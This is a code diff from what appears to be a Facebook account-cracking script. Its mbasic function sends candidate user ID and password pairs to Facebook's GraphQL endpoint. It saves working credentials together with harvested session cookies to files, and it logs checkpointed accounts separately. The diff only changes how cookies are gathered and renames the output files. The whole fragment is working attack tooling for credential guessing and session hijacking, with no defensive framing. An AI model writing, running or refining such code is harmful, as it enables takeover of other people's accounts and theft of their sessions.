@@ -1330,39 +1330,27 @@ def mbasic(uid,pwx,tl):
             twf = "login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             response = Session.post('https://graph.facebook.com/graphql', data=encode)
             if "session_key" in response.text and "uid" in response.text:
-                cokie = {
-                    "datr": re.search('"name":"datr","value":"(.*?)"', response.text.replace('\\', '')).group(1),
-					"sb": base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-"),
-					"fr": re.search('"name":"fr","value":"(.*?)"', response.text.replace('\\', '')).group(1),
-					"c_user": re.search('"name":"c_user","value":"(\d+)"', response.text.replace('\\', '')).group(1),
-					"xs": re.search('"name":"xs","value":"(.*?)"', response.text.replace('\\', '')).group(1),
-                }
-                cookie = ';'.join(f'{key}={value}' for key, value in cokie.items())
-                print(f" {green}(ATOM-OK) {uid}|{pw}|{cookie} ")
+                print(f" {green}(ATOM-OK) {uid}|{pw}")
+                cookie = '; '.join([f'{k}={v}' for k, v in Session.cookies.get_dict().items()])
+                print(f" {green}(ATOM-coki) {cookie} ")
                 open("/sdcard/SUMON_file_ok1.txt", "a").write(f"{uid}|{pw}|{cookie}\n")
                 oks.append(uid)
                 break
             elif "c_user" in response.text.replace('\\', '') and "access_token" in response.text:
-                cokie = {
-                    "datr": re.search('"name":"datr","value":"(.*?)"', response.text.replace('\\', '')).group(1),
-					"sb": base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-"),
-					"fr": re.search('"name":"fr","value":"(.*?)"', response.text.replace('\\', '')).group(1),
-					"c_user": re.search('"name":"c_user","value":"(\d+)"', response.text.replace('\\', '')).group(1),
-					"xs": re.search('"name":"xs","value":"(.*?)"', response.text.replace('\\', '')).group(1),
-                }
-                cookie = ';'.join(f'{key}={value}' for key, value in cokie.items())
-                print(f" {green}(ATOM-OK) {uid}|{pw}|{cookie} ")
-                open("/sdcard/SUMON_file_ok1.txt", "a").write(f"{uid}|{pw}|{cookie}\n")
+                print(f" {green}(ATOM-OK) {uid}|{pw}")
+                cookie = '; '.join([f'{k}={v}' for k, v in Session.cookies.get_dict().items()])
+                print(f" {green}(ATOM-coki) {cookie} ")
+                open("/sdcard/SUMON_file_ok2.txt", "a").write(f"{uid}|{pw}|{cookie}\n")
                 oks.append(uid)
                 break
             elif "com.bloks.www.ap.two_step_verification.entrypoint_async" in response.text:
                 print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
-                open("/sdcard/SUMON_file_2f2.txt", "a").write(f"{uid}|{pw}\n")
+                open("/sdcard/SUMON_file_CP1.txt", "a").write(f"{uid}|{pw}\n")
                 cps.append(uid)
                 break
             elif "error_user_title" in response.text.replace('\\', '') and "checkpoint" in response.text.replace('\\', ''):
                 print('\33[1;91m[ATOM-CP] '+uid+' | '+pw+'\33[0;97m')
-                open("/sdcard/SUMON_file_2f2.txt", "a").write(f"{uid}|{pw}\n")
+                open("/sdcard/SUMON_file_CP2.txt", "a").write(f"{uid}|{pw}\n")
                 cps.append(uid)
                 break
             else:
